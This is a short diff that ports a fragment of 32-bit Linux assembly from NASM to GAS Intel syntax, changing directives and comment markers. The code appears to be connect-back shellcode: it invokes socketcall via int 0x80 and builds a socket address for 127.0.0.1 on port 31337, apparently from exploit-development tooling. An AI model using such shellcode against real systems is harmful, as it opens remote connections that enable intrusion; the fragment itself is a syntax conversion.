@@ -1,5 +1,5 @@
-BITS 32
-global _start
+.intel_syntax noprefix
+.globl _start
 _start:
     xor eax,eax
     mov al,0x66
@@ -13,9 +13,9 @@ _start:
     int 0x80
     pop ebx
     pop ebp
-    mov esi,0x100007f ; hex(u32(binary_ip('')))
+    mov esi,0x100007f # hex(u32(binary_ip('')))
     push esi
-    mov bp,0x7a69 ; 31337
+    mov bp,0x7a69 # 31337
     bswap ebp
     or ebp,ebx
     push ebp
